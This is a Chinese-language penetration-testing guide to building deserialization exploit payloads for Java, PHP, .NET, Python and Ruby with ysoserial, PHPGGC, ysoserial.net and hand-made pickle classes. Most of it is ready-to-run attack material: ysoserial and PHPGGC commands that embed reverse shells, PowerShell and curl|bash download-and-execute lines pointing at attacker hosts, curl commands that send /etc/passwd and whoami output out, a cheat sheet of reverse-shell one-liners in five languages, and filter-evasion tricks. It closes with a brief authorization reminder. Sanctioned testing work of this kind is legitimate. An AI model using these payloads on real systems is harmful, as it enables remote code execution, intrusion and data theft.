# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供反序列化漏洞 Payload 生成的系统化指南。通过本方法论，测试人员能够根据目标环境、依赖库、序列化格式等因素，选择合适的工具和方法生成有效的反序列化 Payload。

## 1.2 适用范围

本文档适用于以下场景：
- Java 反序列化 Payload 生成
- PHP 反序列化 Payload 生成
- .NET 反序列化 Payload 生成
- Python 反序列化 Payload 生成
- Ruby 反序列化 Payload 生成
- 其他语言/框架的反序列化测试

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行漏洞验证的安全分析师
- 安全研究人员
- 红队成员

---

# 第二部分：Payload 生成指南

## 专题一：反序列化 Payload 生成

### 2.1 技术介绍

反序列化 Payload 生成是根据目标环境特征，使用工具或手动构造能够触发代码执行的序列化数据的过程。

**Payload 生成要素：**
- 目标语言/框架识别
- 依赖库版本确认
- Gadget 链选择
- 命令/代码构造
- 格式编码处理

### 2.2 Java Payload 生成

#### 2.2.1 ysoserial 工具使用

**工具介绍：**
ysoserial 是最常用的 Java 反序列化 Payload 生成工具，支持多种 Gadget 链。

**基本用法：**
```bash
# 列出所有可用 Gadget
java -jar ysoserial.jar

# 生成 Payload
java -jar ysoserial.jar <Gadget> <Command> > payload.bin

# 生成 Base64 编码的 Payload
java -jar ysoserial.jar <Gadget> <Command> | base64
```

**常用 Gadget 及适用条件：**

| Gadget | 依赖库 | 版本要求 | 稳定性 |
|-------|--------|---------|--------|
| **CommonsCollections1** | commons-collections | 3.1-3.2.1 | 稳定 |
| **CommonsCollections2** | commons-collections4 | 4.0 | 稳定 |
| **CommonsCollections3** | commons-collections | 3.1-3.2.1 | 稳定 |
| **CommonsCollections5** | commons-collections | 3.1-3.2.1 | 稳定 |
| **CommonsCollections6** | commons-collections | 3.1-3.2.1 | 稳定 |
| **CommonsBeanUtils1** | commons-beanutils | 1.9.2 | 稳定 |
| **Groovy1** | groovy | 2.3.9 | 稳定 |
| **Spring1** | spring-aop | 4.1.4 | 稳定 |
| **Hibernate1** | hibernate | 5.0.7 | 中 |
| **Wicket1** | wicket | 6.23.0 | 中 |
| **Click1** | click | 2.3.0 | 中 |

**命令执行 Payload 示例：**

```bash
# 基础命令执行
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > pwned.bin

# 反弹 Shell (Bash)
java -jar ysoserial.jar CommonsCollections5 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > shell.bin

# 反弹 Shell (Python)
java -jar ysoserial.jar CommonsCollections5 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'" > shell.bin

# DNS 外带
java -jar ysoserial.jar CommonsCollections1 "curl http://your-dnslog.com" > dns.bin

# HTTP 外带
java -jar ysoserial.jar CommonsCollections1 "curl http://your-server.com/\$(whoami)" > http.bin
```

#### 2.2.2 其他 Java Payload 工具

**SerialKiller:**
```bash
# 生成 Payload
java -jar SerialKiller.jar -g CommonsCollections1 -c "command"
```

**JREPL:**
```bash
# 生成绕过 WAF 的 Payload
java -jar jrepl.jar CommonsCollections1 "command" --encoding base64
```

### 2.3 PHP Payload 生成

#### 2.3.1 PHPGGC 工具使用

**工具介绍：**
PHPGGC 是 PHP 反序列化 Payload 生成工具，支持多种框架和库。

**基本用法：**
```bash
# 列出所有可用 Gadget
php phpggc.php -l

# 生成 Payload
php phpggc.php <Gadget> <Command>

# 生成 URL 编码的 Payload
php phpggc.php <Gadget> <Command> -u

# 生成 Base64 编码的 Payload
php phpggc.php <Gadget> <Command> -b
```

**常用 Gadget 及适用条件：**

| Gadget | 框架/库 | 描述 |
|-------|--------|------|
| **monolog/rce1** | Monolog | 日志库，适用性广 |
| **monolog/rce2** | Monolog | Monolog 另一种利用方式 |
| **laravel/rce1** | Laravel | Laravel 框架 |
| **symfony/rce1** | Symfony | Symfony 框架 |
| **swiftmailer/rce1** | SwiftMailer | 邮件库 |
| **wordpress/wp-developer-tools/rce1** | WordPress | WP 开发者工具 |
| **guzzle/rce1** | Guzzle | HTTP 客户端 |
| **phpunit/rce1** | PHPUnit | 测试框架 |

**命令执行 Payload 示例：**

```bash
# 基础命令执行
php phpggc.php monolog/rce1 "phpinfo()"

# 命令执行
php phpggc.php monolog/rce1 "system('id')"

# 反弹 Shell
php phpggc.php monolog/rce1 "exec('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"')"

# Laravel Cookie Payload
php phpggc.php laravel/rce1 "command" --cookie

# WordPress Payload
php phpggc.php wordpress/wp-developer-tools/rce1 "command"
```

#### 2.3.2 手动构造 Payload

```php
<?php
// 简单 Payload 构造示例
class User {
    public $name;
    
    function __destruct() {
        system($this->name);
    }
}

$user = new User();
$user->name = "id";
echo serialize($user);
// 输出：O:4:"User":1:{s:4:"name";s:2:"id";}
?>
```

### 2.4 .NET Payload 生成

#### 2.4.1 ysoserial.net 工具使用

**工具介绍：**
ysoserial.net 是 .NET 反序列化 Payload 生成工具。

**基本用法：**
```bash
# 列出所有可用 Gadget
ysoserial.exe -h

# 生成 Payload
ysoserial.exe -f <Formatter> -g <Gadget> -c <Command>

# 生成 ViewState Payload
ysoserial.exe -p ViewState -g <Gadget> -c <Command>
```

**常用 Gadget 及适用条件：**

| Gadget | 适用场景 | 描述 |
|-------|---------|------|
| **TextFormattingRunProperties** | ViewState | XAML 相关 |
| **ObjectDataProvider** | BinaryFormatter/JSON.NET | 通用 |
| **ActivitySurrogateSelector** | BinaryFormatter | .NET Framework |
| **ClaimsIdentity** | BinaryFormatter | WIF 相关 |
| **TypeConfuseDelegate** | BinaryFormatter | .NET 4.0-4.5.1 |

**命令执行 Payload 示例：**

```bash
# BinaryFormatter Payload
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc.exe"

# JSON.NET Payload
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"

# ViewState Payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""

# PowerShell 反弹 Shell
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')\""
```

### 2.5 Python Payload 生成

#### 2.5.1 手动构造 Pickle Payload

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = "touch /tmp/pwned"
        return (os.system, (cmd,))

# 生成 Payload
payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())

# 反弹 Shell
class ReverseShell:
    def __reduce__(self):
        import socket
        import subprocess
        import os
        
        host = "10.0.0.1"
        port = 4444
        
        return (
            subprocess.call,
            (["/bin/bash", "-c", f"bash -i >& /dev/tcp/{host}/{port} 0>&1"],)
        )

payload = pickle.dumps(ReverseShell())
```

#### 2.5.2 使用 Pickle 工具

```bash
# 使用 python-pickle-shell 工具
git clone https://github.com/411Hall/python-pickle-shell.git
python pickle_shell.py -c "command" -o payload.pkl
```

### 2.6 通用 Payload 技巧

#### 2.6.1 命令执行技巧

**Bash 反弹 Shell：**
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Python 反弹 Shell：**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell 反弹 Shell：**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')"
```

**PHP 反弹 Shell：**
```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby 反弹 Shell：**
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### 2.6.2 编码技巧

**Base64 编码：**
```bash
# Java
java -jar ysoserial.jar CommonsCollections1 "cmd" | base64

# 通用
echo -n "payload" | base64
```

**URL 编码：**
```bash
# PHP
php phpggc.php monolog/rce1 "cmd" -u
```

**十六进制编码：**
```bash
xxd -p payload.bin | tr -d '\n'
```

#### 2.6.3 绕过技巧

**命令长度限制绕过：**
```bash
# 使用 curl/wget 下载执行
curl http://attacker.com/shell.sh|bash

# 使用 Base64 编码命令
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash
```

**字符过滤绕过：**
```bash
# 空格过滤
cat${IFS}/etc/passwd

# 关键字过滤
c""at /etc/passwd
c$@at /etc/passwd
```

---

# 第三部分：附录

## 3.1 Payload 生成工具汇总

| 工具 | 语言 | 地址 |
|-----|------|------|
| **ysoserial** | Java | https://github.com/frohoff/ysoserial |
| **ysoserial.net** | .NET | https://github.com/pwntester/ysoserial.net |
| **PHPGGC** | PHP | https://github.com/ambionics/phpggc |
| **pickle-shell** | Python | https://github.com/411Hall/python-pickle-shell |
| **marshmallow_pickle** | Python | https://github.com/nicktimko/marshmallow_pickle |
| **RubyMarshal** | Ruby | https://github.com/0x00-0x00/RubyMarshal |

## 3.2 常用命令速查表

| 目的 | 命令 |
|-----|------|
| **信息收集** | `whoami`, `id`, `hostname`, `uname -a` |
| **文件读取** | `cat /etc/passwd`, `type C:\Windows\win.ini` |
| **目录列表** | `ls -la`, `dir` |
| **网络信息** | `ifconfig`, `ipconfig`, `netstat -an` |
| **进程列表** | `ps aux`, `tasklist` |
| **反弹 Shell** | 见 2.6.1 节 |
| **DNS 外带** | `curl http://dnslog.com/$(whoami)` |
| **HTTP 外带** | `curl -X POST -d @/etc/passwd http://attacker.com` |

## 3.3 Payload 测试流程

1. **环境识别** - 确定目标语言和框架
2. **依赖检测** - 识别可用的依赖库
3. **Gadget 选择** - 根据依赖选择合适的 Gadget
4. **Payload 生成** - 使用工具生成 Payload
5. **编码处理** - 根据需要进行编码
6. **发送测试** - 发送 Payload 并观察响应
7. **结果验证** - 通过响应/外带确认执行

## 3.4 注意事项

1. **合法授权** - 确保有合法测试授权
2. **测试环境** - 优先在测试环境测试
3. **备份数据** - 测试前备份重要数据
4. **影响评估** - 评估 Payload 可能的影响
5. **日志记录** - 记录所有测试操作
6. **清理工作** - 测试后清理测试痕迹
